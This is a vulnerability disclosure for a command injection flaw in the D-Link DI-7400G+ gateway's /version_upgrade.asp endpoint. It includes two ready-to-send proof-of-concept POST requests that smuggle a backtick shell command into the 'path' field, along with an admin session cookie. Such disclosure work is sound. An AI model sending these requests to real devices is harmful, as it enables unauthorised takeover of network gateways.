# Information

# D-Link DI-7400G+ Gateway Arbitrary Command Execution Vulnerability

**Vendor of the products:**  D-Link

**Vendor's website:** https://www.dlink.com.cn/

**Affected products:**  DI-7400G+

**Affected products infomation:** https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-7400G%2B

**Affected firmware version:** V19.12.25A1

**Firmware download address:** [D-Link Technical Support](https://www.dlink.com.cn/techsupport/download.ashx?file=7773)

**Sumbitter:** Yun Zhang (@DavCloudz)


# Overview

D-Link DI-7400G+ Smart & Simple Series enterprise gateways contain an arbitrary command execution vulnerability in the /version_upgrade.asp path. An attacker can exploit this vulnerability by crafting a malicious HTTP POST request to the /version_upgrade.asp endpoint, resulting in arbitrary command execution on the device.

# Vulnerability details

The API for invoking the function.

<img width="865" height="415" alt="image" src="https://github.com/user-attachments/assets/246e119f-b84b-47b0-b2bd-dfd560525b82" />


At the request handling function address 0x0043def0, insufficient input sanitization allows command execution through concatenation of the 'time' or 'path' parameters.

<img width="865" height="368" alt="image" src="https://github.com/user-attachments/assets/a75e53ec-2835-4022-af51-4de4f7cc3c3c" />


<img width="865" height="738" alt="image" src="https://github.com/user-attachments/assets/d8a99c59-8e7e-47c3-ba3d-d1c0f643f421" />


# POC1

```
POST /version_upgrade.asp HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.0.1/index.htm?_1546272359
Cookie: wysLanguage=CN; userid=admin; gw_userid=admin,gw_passwd=F499CB5B7A1156B90910F2EE55A10A98
Priority: u=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

time=123&path=`ls>/pwn.txt`
```

# POC2
```
POST /version_upgrade.asp HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://192.168.0.1/index.htm?_1546272359
Cookie: wysLanguage=CN; userid=admin; gw_userid=admin,gw_passwd=F499CB5B7A1156B90910F2EE55A10A98
Priority: u=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

path=`ls>/pwn.txt`
```

The malicious POST payload was successfully submitted via Burpsuite.

<img width="865" height="341" alt="image" src="https://github.com/user-attachments/assets/182ed6f0-2d41-48f4-9f49-f5bd6822bd5e" />

Execution of the payload enables arbitrary system command injection with full control, thereby compromising the system.

<img width="865" height="492" alt="image" src="https://github.com/user-attachments/assets/3e2e3138-fd4b-49e2-9eb5-1350cae38267" />
